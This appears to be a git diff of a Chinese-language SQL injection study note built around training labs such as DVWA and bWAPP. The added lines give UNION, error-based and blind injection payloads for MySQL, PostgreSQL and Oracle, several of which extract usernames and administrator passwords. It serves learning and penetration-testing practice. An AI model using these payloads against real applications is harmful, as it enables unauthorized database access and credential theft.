@@ -66,6 +66,7 @@ SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传�
 
 ```sql
 1' order by 3 #
+1' order by 3 --+
 ```
 
 **确定回显字段**
@@ -77,6 +78,31 @@ SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传�
 ```sql
 ' union select 1,2,3 #
 ```
+```sql
+' union select null,null,null --+ 
+
+# oracle
+' union select null,null from dual --+ 
+```
+<span style="font-size: 19px;">**Querying the database type and version**</span>
+
+[sql-injection-cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+| Database type  |  Query |
+|----------------|--------|
+| Microsoft, MySQL  | `SELECT @@version` |
+|  Oracle |  `SELECT banner FROM v$version` |
+| PostgreSQL  | `SELECT version()`  |
+
+<span style="font-size: 19px;">**不同数据库类型字符串串联语法**</span>
+
+| 数据库类型 | 字符串串联语法 (Concatenation Syntax) |
+| :--- | :--- |
+| **Oracle** | `username\|\| '-' \|\|password` |
+| **Microsoft (SQL Server)** | `username+ '-' +password` |
+| **PostgreSQL** | `username \|\| '-' \|\|password` |
+| **MySQL** | `CONCAT(username, '-', password)` |
+
 ## union注入
 
 **union联合查询**
@@ -89,15 +115,19 @@ SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传�
 ```sql
 1' union select 1,user(),database(),version(),group_concat(table_name),6,7 from information_schema.tables where table_schema = database() #
 ```
+*查询当前操作的数据库*
+```sql
+' union select 1,database() #
+
+# PostgreSQL
+' union select version(),current_database() --+
+```
 
 *查询数据库*
 ```sql
 ' union select 1,group_concat(schema_name) from information_schema.schemata #
 ```
-*查询当前操作的数据库*
-```sql
-' union select 1,database() #
-```
+
 *查询指定数据库的表*
 ```sql
 ' union select 1,group_concat(table_name) from information_schema.tables where table_schema = 'dvwa' #
@@ -110,6 +140,21 @@ SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传�
 ```sql
 ' union select 1,group_concat(username,':',password SEPARATOR '<br>') from dvwa.users #
 ```
+
+<span style="font-size: 19px;">**Oracle Union注入**</span>
+
+```bash
+# 查询所有表
+' union select null,table_name from all_tables --+
+
+# 查询表对应的字段
+' union select column_name,null from all_tab_columns where table_name = 'USERS_LUVUXW' --+
+
+# 查询结果
+' union select USERNAME_JCAQMT,PASSWORD_ETJOZN from USERS_LUVUXW
+
+```
+
 ---
 
 ## 读写
@@ -282,6 +327,7 @@ MySQL 的报错注入主要是利用 MySQL 的一些逻辑漏洞，如 BigInt �
 2. `extractvalue` 函数；(最多32字符)
 3. `updatxml` 函数；
 4. `exp()` 函数；
+5. `cast()`函数
 
 <span style="font-size: 19px;">**floor、rand(0)和group by**</span>
 
@@ -316,8 +362,6 @@ select updatexml(1,concat(0x7e,(SELECT @@version)),1);
 ```bash
 ?id=2' and updatexml(1,concat(0x7e,(SELECT @@version)),1) -- '
 ```
-
-
 - `updatexml(xml_target, xpath_expression, new_xml)` 这是一个 **MySQL** 用于修改 **XML** 数据的内置函数。它接收三个参数：
   - `xml_target`：目标 **XML** 内容或文档。
   - `xpath_expression`：用于定位要修改的 **XML** 节点的 **XPath** 路径。
@@ -362,11 +406,63 @@ XPATH syntax error: '~password'
 XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882'
 - `mid()` 函数：**字符串截取**，`MID(str, start, length)`
 
+<span style="font-size: 19px;">**cast()**</span>
+
+```bash
+' AND 1=CAST((SELECT 1) AS int) --
+```
+```bash
+' AND 1=CAST((SELECT username FROM users) AS int) --
+```
 ---
 
 ## Blind
 
 [Blind SQLi](../security/webpentesting.md#inferential-blind-sqli)
+
+### Boolean-Based
+
+通过构造**真（True）/ 假（False）** 条件的 SQL 语句，观察页面的**两种不同响应**来逐位推断数据。
+
+```
+条件为 TRUE  → 页面正常显示（如：显示内容、登录成功）
+条件为 FALSE → 页面异常显示（如：空白、"Not Found"、登录失败）
+```
+
+```bash
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a' --+
+```
+```bash
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' --+
+```
+<span style="font-size: 19px;">**Exploiting blind SQL injection by triggering conditional errors**</span>
+
+```bash
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a' --+
+```
+
+**Oracle**
+
+*确定表*
+```bash
+'||(select '' from users where rownum=1)||'
+```
+*确定表中的用户*
+```bash
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+```
+```bash
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' )||'
+```
+*确定密码*
+```bash
+'||(SELECT CASE WHEN LENGTH(password)>10 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+```bash
+'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+
+
 
 ### Time-Based
 
@@ -374,33 +470,15 @@ XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882'
 
 <img src="./assets/时间盲注常用函数.png" alt="background" width="433" >
 
-**靶场bWAPP: SQL Injection - Blind - Time-Based**
-```javascript
-# 慢(true)
-World War Z' and length(database())>3 and sleep(2) --  
-
-# 快(false)
-World War Z' and length(database())>5 and sleep(2) --  
-
-# 慢(true)
-World War Z' and length(database())>4 and sleep(2) --  
-
-# 慢(true)
-World War Z' and length(database())=5 and sleep(2) -- 
-```
+**PoC**
 
 ```javascript
-# 快(false)
-World War Z' and substr(database(),1,1)='a' and sleep(2) -- 
+# guess length
+1' and length(database())>3 and sleep(2) -- '  
 
-# 慢(true) 说明第一个字符是b
-World War Z' and substr(database(),1,1)='b' and sleep(2) -- 
-World War Z' and ascii(substr(database(),1,1))=98 and sleep(2) -- 
-...
-# 慢(true) 说明前两个字符是bW
-World War Z' and substr(database(),1,2)='bW' and sleep(2) -- 
-World War Z' and ascii(substr(database(),2,1))=87 and sleep(2) -- 
-...
+# guess character
+1' and substr(database(),1,1)='a' and sleep(2) -- '
+1' and ascii(substr(database(),1,1)) > 97 -- '
 ```
 
 <span style="font-size: 19px;">**时间盲注 自动化代码**</span>
